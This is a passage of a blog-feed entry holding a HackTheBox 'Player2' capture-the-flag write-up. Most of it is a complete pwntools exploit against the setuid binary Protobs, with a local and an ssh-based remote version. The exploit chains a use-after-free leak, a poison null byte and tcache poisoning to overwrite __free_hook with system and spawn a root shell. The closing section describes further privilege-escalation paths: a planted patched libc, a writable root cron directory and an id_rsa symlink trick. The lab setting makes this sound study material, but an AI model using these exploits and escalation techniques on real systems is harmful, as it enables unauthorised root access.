\/\u003E\u003C\/div\u003E\u003Cdiv\u003Ep = process('.\/Protobs')\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E#it's suid so life becomes even easier!\u003C\/div\u003E\u003Cdiv\u003E#bss at 0x603060\u003C\/div\u003E\u003Cdiv\u003Edef wait():\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.recvrepeat(0.1)\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Edef alloc(size, desc, game='', contrast=0,gamma=0,xres=0,yres=0,controller=0):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline('2')\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(game)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(contrast))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(gamma))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(xres))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(yres))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(controller))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(size))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if size is not 0:\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; p.sendline(desc)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Edef free(index):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline('4')\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(index))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Edef show(index):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline('3')\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(index))\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003C\/div\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EThen I got a heap and libc leak using the UAF bug above.\u0026nbsp; It is important to keep track of how many tcachebins you have left in the 0x40 and try to keep it filled up, especially before the poison null byte, so they do not interfere with your poison null byte setup.\u0026nbsp; Hopefully, my comments below will help clear up any confusion.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E\u003Cdiv\u003Esmall = 0x198\u003C\/div\u003E\u003Cdiv\u003Ebig = 0x4f0 #500\u003C\/div\u003E\u003Cdiv\u003Ep.recvrepeat(2)\u003C\/div\u003E\u003Cdiv\u003Ewait()\u003C\/div\u003E\u003Cdiv\u003E#fill with 6 tcache bins\u003C\/div\u003E\u003Cdiv\u003Efor i in range(3):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x30, 'A' * 0x20)\u003C\/div\u003E\u003Cdiv\u003Efor i in range(3):\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(i) #6 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ealloc(0, 'blah')\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Eshow(0) #5 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ep.recvuntil('[ Description\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: ')\u003C\/div\u003E\u003Cdiv\u003Eheapleak = p.recvline()[:-1]\u003C\/div\u003E\u003Cdiv\u003Eheapleak = u64(heapleak.ljust(8, '\\x00'))\u003C\/div\u003E\u003Cdiv\u003Elog.info('Heap leak: ' + hex(heapleak))\u0026nbsp;\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x500, 'A' * 0x30) #4 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x200, 'A' * 0x30) #3 chunks in tcache, chunk index 2\u003C\/div\u003E\u003Cdiv\u003Efree(2) #prevent top consolidation, back to 4 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Efree(1) #for libc leaking, 5 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ealloc(0, 'blah') #4 chunks in tcache, chunk 1\u003C\/div\u003E\u003Cdiv\u003Eshow(1) #1 is taken up\u003C\/div\u003E\u003Cdiv\u003Ep.recvuntil('[ Description\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: ')\u003C\/div\u003E\u003Cdiv\u003Elibcleak = p.recvline()[:-1]\u003C\/div\u003E\u003Cdiv\u003Elibcleak = u64(libcleak.ljust(8, '\\x00'))\u003C\/div\u003E\u003Cdiv\u003Elibc.address = libcleak -\u0026nbsp; 0x1e4c40 - 96\u003C\/div\u003E\u003Cdiv\u003Elog.info(\"Libc Base: \" + hex(libc.address))\u0026nbsp;\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EAs I mentioned earlier, I would prefer to have all the tcachebins for the game metadata structs filled so they do not interfere with my poison null byte setup.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E#fill rest of tcache\u003C\/div\u003E\u003Cdiv\u003Efor i in range(4):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x200, 'A' * 0x20) #2, 3, 4, 5\u003C\/div\u003E\u003Cdiv\u003E#empty it\u003C\/div\u003E\u003Cdiv\u003Efor i in range(3):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0, '') #6, 7, 8\u003C\/div\u003E\u003Cdiv\u003Efor i in range(7):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(i+2)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;#7 chunks in 0x40 tcache\u003C\/div\u003E\u003Cdiv\u003E#tcache should be filled now\u003C\/div\u003E\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003ENow it's time for the poison null byte.\u0026nbsp; Just remember what I said before and you should be fine.\u0026nbsp; There is however one thing to note, and it's the size I chose to overwrite.\u0026nbsp; I allocated 0x4f0 for it so it becomes 0x500.\u0026nbsp; Not only do I avoid having to fill tcachebin for it before it does the coalesce\/unsorted mechanism, but when I overwrite it, it will become 0x501 (prev in use is on) to 0x500.\u0026nbsp; This way, I won't have to deal with the libc checks that check the chunks afterwards as the size did not actually change.\u0026nbsp; Also, you will need to slowly write the poison null bytes by writing backwards byte by byte due to the way it transfers the data from the buffer to the heap in the allocation function.\u0026nbsp; You will also need to make sure you have a freed chunk in that coaelesced region to create heap overlap afterwards.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E#now time for poison null byte\u003Cbr \/\u003Ealloc(0x50, 'C' * 0x38 + p64(heapleak+0xa50)) #2\u003C\/div\u003E\u003Cdiv\u003E#wipe out null bytes to set up forged chunk correctly\u003C\/div\u003E\u003Cdiv\u003Efor i in range(6):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(2)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x50, 'C' * (0x38-i-1))\u003C\/div\u003E\u003Cdiv\u003Efree(2) #continue setting up forged chunk\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x50, 'C' * 0x30 + p64(heapleak+0xa50))\u003C\/div\u003E\u003Cdiv\u003Efor i in range(6):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(2)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x50, 'C' * (0x30-i-1))\u003C\/div\u003E\u003Cdiv\u003Efree(2)\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x50, 'C' * 0x28 + p64(small+0x38)) #2\u003C\/div\u003E\u003Cdiv\u003E#forged chunk should be good to go\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'D' * 0x100) #3\u003C\/div\u003E\u003Cdiv\u003Ealloc(big, 'E' * 0x100) #4\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x210, '') #prevent top consolidation #5\u003C\/div\u003E\u003Cdiv\u003Efree(3)\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'F' * (small)) #poison null byte\u003C\/div\u003E\u003Cdiv\u003E#set up fake prev_size\u003C\/div\u003E\u003Cdiv\u003Efree(3)\u003C\/div\u003E\u003Cdiv\u003Efor i in range(6):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(small, 'F' * (small-i-1))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(3)\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'F'*(small-0x8)+p64(small+0x38))\u003C\/div\u003E\u003Cdiv\u003Efree(3)\u003C\/div\u003E\u003Cdiv\u003Efree(4) #chunk coaelesced now\u003C\/div\u003E\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003ENow you have coalesced region with a free chunk pointing to the same region, thereby creating heap overlap.\u0026nbsp; Technically, tcache poison by overwriting the fd pointers is very trivial, but beware the tcache count check.\u0026nbsp; This can be handled by allocating several tcache bins of the same size and then putting them all in the respective tcache bins, so when you poison the tcache bins, you will have enough for tcache counts to not worry about it becoming -1 and thus not giving the target region back.\u0026nbsp; Then overwrite free hook with system and pop a shell with a string since you control the rdi value for free.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003Ealloc(0x20, 'temp')\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x20, 'ZZZZ')\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, 'Y' * 0x20) #6\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, 'Y'*0x20) #so tcache count doesn't drop, bypass that check\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, 'Y' * 0x20)\u003C\/div\u003E\u003Cdiv\u003Efree(6)\u003C\/div\u003E\u003Cdiv\u003Efree(7)\u003C\/div\u003E\u003Cdiv\u003Efree(8)\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'A' * (0x60 + 0x70 + 0x10) + p64(libc.symbols['__free_hook'])) #overlapped chunks\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, '')\u003C\/div\u003E\u003Cdiv\u003E#above was a tcache poison, now overwrite malloc hook\u003C\/div\u003E\u003Cdiv\u003Emagic = [0xe237f, 0xe2383, 0xe2386]\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, p64(libc.symbols['system'])) #8, because it frees the desc first, we can't have it do that\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x300, '', game='\/bin\/bash\\x00') #9\u003C\/div\u003E\u003Cdiv\u003Efree(9)\u003C\/div\u003E\u003Cdiv\u003Ep.interactive()\u003C\/div\u003E\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EFor remote version, I just used ssh from pwn tools and slowed down the timing.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E  \u003Cdiv class=\"code\"\u003E\u003Cdiv\u003Efrom pwn import *\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E#context.log_level = 'debug'\u003C\/div\u003E\u003Cdiv\u003E#no pie\u003C\/div\u003E\u003Cdiv\u003Ebin = ELF('.\/Protobs')\u003C\/div\u003E\u003Cdiv\u003Elibc = ELF('.\/libc.so.6')\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EremoteShell = ssh(host = 'player2.htb', user='observer', keyfile='.\/key')\u003C\/div\u003E\u003Cdiv\u003EremoteShell.set_working_directory('\/opt\/Configuration_Utility')\u003C\/div\u003E\u003Cdiv\u003Ep = remoteShell.process('.\/Protobs')\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E#it's suid so life becomes even easier!\u003C\/div\u003E\u003Cdiv\u003E#bss at 0x603060\u003C\/div\u003E\u003Cdiv\u003Edef wait():\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.recvrepeat(0.3)\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Edef alloc(size, desc, game='', contrast=0,gamma=0,xres=0,yres=0,controller=0):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline('2')\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(game)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(contrast))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(gamma))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(xres))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(yres))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(controller))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(size))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; if size is not 0:\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; p.sendline(desc)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Edef free(index):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline('4')\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(index))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Edef show(index):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline('3')\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; wait()\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; p.sendline(str(index))\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Esmall = 0x198\u003C\/div\u003E\u003Cdiv\u003Ebig = 0x4f0 #500\u003C\/div\u003E\u003Cdiv\u003Ep.recvrepeat(2)\u003C\/div\u003E\u003Cdiv\u003Ewait()\u003C\/div\u003E\u003Cdiv\u003E#fill with 6 tcache bins\u003C\/div\u003E\u003Cdiv\u003Efor i in range(3):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x30, 'A' * 0x20)\u003C\/div\u003E\u003Cdiv\u003Efor i in range(3):\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(i) #6 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ealloc(0, 'blah')\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Eshow(0) #5 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ep.recvuntil('[ Description\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: ')\u003C\/div\u003E\u003Cdiv\u003Eheapleak = p.recvline()[:-1]\u003C\/div\u003E\u003Cdiv\u003Eheapleak = u64(heapleak.ljust(8, '\\x00'))\u003C\/div\u003E\u003Cdiv\u003Elog.info('Heap leak: ' + hex(heapleak))\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x500, 'A' * 0x30) #4 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x200, 'A' * 0x30) #3 chunks in tcache, chunk index 2\u003C\/div\u003E\u003Cdiv\u003Efree(2) #prevent top consolidation, back to 4 chunks in tcache\u003C\/div\u003E\u003Cdiv\u003Efree(1) #for libc leaking, 5 chunk in tcache\u003C\/div\u003E\u003Cdiv\u003Ealloc(0, 'blah') #4 chunks in tcache, chunk 1\u003C\/div\u003E\u003Cdiv\u003Eshow(1) #1 is taken up\u003C\/div\u003E\u003Cdiv\u003Ep.recvuntil('[ Description\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: ')\u003C\/div\u003E\u003Cdiv\u003Elibcleak = p.recvline()[:-1]\u003C\/div\u003E\u003Cdiv\u003Elibcleak = u64(libcleak.ljust(8, '\\x00'))\u003C\/div\u003E\u003Cdiv\u003Elibc.address = libcleak -\u0026nbsp; 0x1e4c40 - 96\u003C\/div\u003E\u003Cdiv\u003Elog.info(\"Libc Base: \" + hex(libc.address)) #know that read maxes out at 0x200\u003C\/div\u003E\u003Cdiv\u003E#fill rest of tcache\u003C\/div\u003E\u003Cdiv\u003Efor i in range(4):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x200, 'A' * 0x20) #2, 3, 4, 5\u003C\/div\u003E\u003Cdiv\u003E#empty it\u003C\/div\u003E\u003Cdiv\u003Efor i in range(3):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0, '') #6, 7, 8\u003C\/div\u003E\u003Cdiv\u003Efor i in range(7):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(i+2)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;#7 chunks in 0x40 tcache\u003C\/div\u003E\u003Cdiv\u003E#tcache should be filled now\u003C\/div\u003E\u003Cdiv\u003E#now time for poison null byte\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x50, 'C' * 0x38 + p64(heapleak+0xa50)) #2\u003C\/div\u003E\u003Cdiv\u003E#wipe out null bytes to set up forged chunk correctly\u003C\/div\u003E\u003Cdiv\u003Efor i in range(6):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(2)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x50, 'C' * (0x38-i-1))\u003C\/div\u003E\u003Cdiv\u003Efree(2) #continue setting up forged chunk\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x50, 'C' * 0x30 + p64(heapleak+0xa50))\u003C\/div\u003E\u003Cdiv\u003Efor i in range(6):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(2)\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(0x50, 'C' * (0x30-i-1))\u003C\/div\u003E\u003Cdiv\u003Efree(2)\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x50, 'C' * 0x28 + p64(small+0x38)) #2\u003C\/div\u003E\u003Cdiv\u003E#forged chunk should be good to go\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'D' * 0x100) #3\u003C\/div\u003E\u003Cdiv\u003Ealloc(big, 'E' * 0x100) #4\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x210, '') #prevent top consolidation #5\u003C\/div\u003E\u003Cdiv\u003Efree(3)\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'F' * (small)) #poison null byte\u003C\/div\u003E\u003Cdiv\u003E#set up fake prev_size\u003C\/div\u003E\u003Cdiv\u003Efree(3)\u003C\/div\u003E\u003Cdiv\u003Efor i in range(6):\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; alloc(small, 'F' * (small-i-1))\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; free(3)\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'F'*(small-0x8)+p64(small+0x38))\u003C\/div\u003E\u003Cdiv\u003Efree(3)\u003C\/div\u003E\u003Cdiv\u003Efree(4) #chunk coaelesced now\u003C\/div\u003E\u003Cdiv\u003Ep.interactive()\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x20, 'temp')\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x20, 'ZZZZ')\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, 'Y' * 0x20) #6\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, 'Y'*0x20) #so tcache count doesn't drop, bypass that check\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, 'Y' * 0x20)\u003C\/div\u003E\u003Cdiv\u003Efree(6)\u003C\/div\u003E\u003Cdiv\u003Efree(7)\u003C\/div\u003E\u003Cdiv\u003Efree(8)\u003C\/div\u003E\u003Cdiv\u003Ealloc(small, 'A' * (0x60 + 0x70 + 0x10) + p64(libc.symbols['__free_hook'])) #overlapped chunks\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, '')\u003C\/div\u003E\u003Cdiv\u003Emagic = [0xe237f, 0xe2383, 0xe2386]\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x60, p64(libc.symbols['system'])) #8, because it frees the desc first, we can't have it do that\u003C\/div\u003E\u003Cdiv\u003Ealloc(0x300, '', game='\/bin\/sh\\x00') #9\u003C\/div\u003E\u003Cdiv\u003Efree(9)\u003C\/div\u003E\u003Cdiv\u003Ep.interactive()\u003C\/div\u003E\u003C\/div\u003E\u003C\/div\u003E\u003Cbr \/\u003EAnd you should now have a root shell!\u0026nbsp; During this box's lifecycle, there were actually several other unintendeds and alternative methods that made this box easier, one of which was the large heap overflow I mentioned above, which could make tcache poisoning trivial.\u003Cbr \/\u003E\u003Cbr \/\u003EAnother one \u003Ca href=\"https:\/\/syst3mfailure.github.io\/ret2dl_resolve\" target=\"_blank\"\u003ED3v17\u003C\/a\u003E and I discovered early on when stracing the binary was that having it patched-elf'd made it search from .\/tls\/x86_64\/x86_64\/libc.so.6 and a few other local sub-directories first before checking the local directory for the libc file. We had write permissions and were able to create one of those directories with a patched libc that redirected one of the program function calls to just call system(\"\/bin\/sh\"). This was patched later on.\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Ca href=\"https:\/\/twitter.com\/xct_de\" target=\"_blank\"\u003EXct\u003C\/a\u003E\u0026nbsp;also took root blood first with an unintended related to a cron job that would execute python files as root from a directory www-data can write to. These files were broadcast.py and connection.py from\u0026nbsp;\/var\/www\/product\/protobs, opening up an easy gateway to root. This path was patched as well.\u003Cbr \/\u003E\u003Cbr \/\u003ELastly, here is a one more unintended\/alternative path I heard from both D3v17 and xct. To quote D3v17: \"A user can upload inotifywait (static binary) and then start monitoring \/home folder using inotifywait -m -r \/home. Inotifywait will show that \/.ssh\/id_rsa is opened,read and closed. So the user can replace id_rsa with a symlink to \/root\/root.txt and read the flag using mqtt.\"\u003Cbr \/\u003E\u003Cbr \/\u003ERegardless, this box was still very fun! Congrats to b14ckh34rt and MrR3boot, who always produces engaging and exciting content!\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Cbr \/\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/6225937035947364111\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"https:\/\/www.willsroot.io\/2020\/06\/player2-hackthebox-writeup.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/6225937035947364111"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/6225937035947364111"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/2020\/06\/player2-hackthebox-writeup.html","title":"Player2 HacktheBox Writeup"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"media$thumbnail":{"xmlns$media":"http://search.yahoo.com/mrss/","url":"https:\/\/1.bp.blogspot.com\/-_DisSoD2thg\/XvYVn9_M2gI\/AAAAAAAABqU\/ceaEKxHBGAQ0W8ms2Ul6yXvfEcZRi7wLgCLcBGAsYHQ\/s72-c\/player2.JPG","height":"72","width":"72"},"thr$total":{"$t":"0"}}]}});